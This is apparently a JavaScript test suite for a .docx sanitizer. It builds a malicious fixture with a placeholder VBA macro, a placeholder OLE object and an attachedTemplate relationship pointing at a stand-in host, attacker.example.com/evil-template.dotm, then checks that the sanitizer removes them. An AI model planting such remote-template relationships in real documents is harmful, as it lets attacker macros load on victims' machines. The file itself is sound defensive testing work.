import yazl from "yazl";
import yauzl from "yauzl";
import { createOoxmlSanitizer, OoxmlSanitizer } from "../src/ooxml-sanitizer.js";

const REAL_PARAGRAPH_TEXT = "This is the real, legitimate paragraph text of the document.";

function zip(entries) {
  return new Promise((resolve, reject) => {
    const zipfile = new yazl.ZipFile();
    for (const [fileName, content] of entries) {
      zipfile.addBuffer(Buffer.from(content), fileName);
    }
    const chunks = [];
    zipfile.outputStream.on("data", (c) => chunks.push(c));
    zipfile.outputStream.on("end", () => resolve(Buffer.concat(chunks)));
    zipfile.outputStream.on("error", reject);
    zipfile.end();
  });
}

function readZipEntryNames(buffer) {
  return new Promise((resolve, reject) => {
    yauzl.fromBuffer(buffer, { lazyEntries: true }, (err, zipfile) => {
      if (err) return reject(err);
      const names = [];
      zipfile.readEntry();
      zipfile.on("entry", (entry) => {
        names.push(entry.fileName);
        zipfile.readEntry();
      });
      zipfile.on("end", () => resolve(names));
      zipfile.on("error", reject);
    });
  });
}

function readZipEntryText(buffer, fileName) {
  return new Promise((resolve, reject) => {
    yauzl.fromBuffer(buffer, { lazyEntries: true }, (err, zipfile) => {
      if (err) return reject(err);
      zipfile.readEntry();
      zipfile.on("entry", (entry) => {
        if (entry.fileName !== fileName) {
          zipfile.readEntry();
          return;
        }
        zipfile.openReadStream(entry, (streamErr, readStream) => {
          if (streamErr) return reject(streamErr);
          const chunks = [];
          readStream.on("data", (c) => chunks.push(c));
          readStream.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
          readStream.on("error", reject);
        });
      });
      zipfile.on("end", () => resolve(null));
      zipfile.on("error", reject);
    });
  });
}

/**
 * Builds a real, structurally valid .docx containing:
 *  - a VBA macro project (word/vbaProject.bin)
 *  - a real embedded OLE object (word/embeddings/oleObject1.bin)
 *  - a dangerous external relationship (attachedTemplate -> a remote URL)
 *  - an ORDINARY external hyperlink relationship (must survive)
 *  - real paragraph text in word/document.xml (must survive byte-identical)
 */
async function maliciousDocx() {
  const documentXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>${REAL_PARAGRAPH_TEXT}</w:t></w:r></w:p>
  </w:body>
</w:document>`;

  const documentRels = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/>
<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://attacker.example.com/evil-template.dotm" TargetMode="External"/>
<Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/perfectly-normal-link" TargetMode="External"/>
</Relationships>`;

  const contentTypes = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.vbaProject"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
</Types>`;

  const rootRels = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`;

  return zip([
    ["[Content_Types].xml", contentTypes],
    ["_rels/.rels", rootRels],
    ["word/document.xml", documentXml],
    ["word/_rels/document.xml.rels", documentRels],
    ["word/vbaProject.bin", "FAKE-VBA-MACRO-BYTECODE-PAYLOAD"],
    ["word/embeddings/oleObject1.bin", "FAKE-EMBEDDED-OLE-OBJECT-PAYLOAD"],
  ]);
}

async function cleanDocx() {
  const documentXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>${REAL_PARAGRAPH_TEXT}</w:t></w:r></w:p>
  </w:body>
</w:document>`;
  const contentTypes = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`;
  const rootRels = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`;
  return zip([
    ["[Content_Types].xml", contentTypes],
    ["_rels/.rels", rootRels],
    ["word/document.xml", documentXml],
  ]);
}

describe("OoxmlSanitizer", () => {
  test("has the expected Sanitizer shape", () => {
    expect(OoxmlSanitizer.name).toBe("OOXML Sanitizer");
    expect(typeof OoxmlSanitizer.sanitize).toBe("function");
  });

  test("removes the VBA macro project", async () => {
    const original = await maliciousDocx();
    const result = await OoxmlSanitizer.sanitize(original);
    const names = await readZipEntryNames(result.buffer);
    expect(names).not.toContain("word/vbaProject.bin");
    expect(result.findings.some((f) => f.rule === "ooxml-macro-removed")).toBe(true);
  });

  test("removes the embedded OLE object", async () => {
    const original = await maliciousDocx();
    const result = await OoxmlSanitizer.sanitize(original);
    const names = await readZipEntryNames(result.buffer);
    expect(names).not.toContain("word/embeddings/oleObject1.bin");
    expect(result.findings.some((f) => f.rule === "ooxml-embedded-object-removed")).toBe(true);
  });

  test("removes the dangerous external attachedTemplate relationship, keeps the ordinary hyperlink", async () => {
    const original = await maliciousDocx();
    const result = await OoxmlSanitizer.sanitize(original);
    const relsXml = await readZipEntryText(result.buffer, "word/_rels/document.xml.rels");
    expect(relsXml).not.toContain("attachedTemplate");
    expect(relsXml).not.toContain("attacker.example.com");
    expect(relsXml).toContain("perfectly-normal-link"); // ordinary hyperlink survives
    expect(result.findings.some((f) => f.rule === "ooxml-external-relationship-removed")).toBe(true);
  });

  test("also drops the now-dangling vbaProject/embedding relationship entries", async () => {
    const original = await maliciousDocx();
    const result = await OoxmlSanitizer.sanitize(original);
    const relsXml = await readZipEntryText(result.buffer, "word/_rels/document.xml.rels");
    expect(relsXml).not.toContain("vbaProject.bin");
    expect(relsXml).not.toContain("oleObject1.bin");
  });

  test("preserves the real document text byte-identical", async () => {
    const original = await maliciousDocx();
    const result = await OoxmlSanitizer.sanitize(original);
    const sanitizedDocXml = await readZipEntryText(result.buffer, "word/document.xml");
    expect(sanitizedDocXml).toContain(REAL_PARAGRAPH_TEXT);
  });

  test("a clean docx with none of these parts produces no findings", async () => {
    const original = await cleanDocx();
    const result = await OoxmlSanitizer.sanitize(original);
    expect(result.findings).toEqual([]);
  });

  test("throws a clear error on a non-zip buffer", async () => {
    await expect(OoxmlSanitizer.sanitize(Buffer.from("not a zip file at all"))).rejects.toThrow(
      /Could not read this file as an OOXML/
    );
  });

  test("createOoxmlSanitizer returns an independent instance with the same shape", () => {
    const custom = createOoxmlSanitizer();
    expect(custom.name).toBe("OOXML Sanitizer");
    expect(typeof custom.sanitize).toBe("function");
  });
});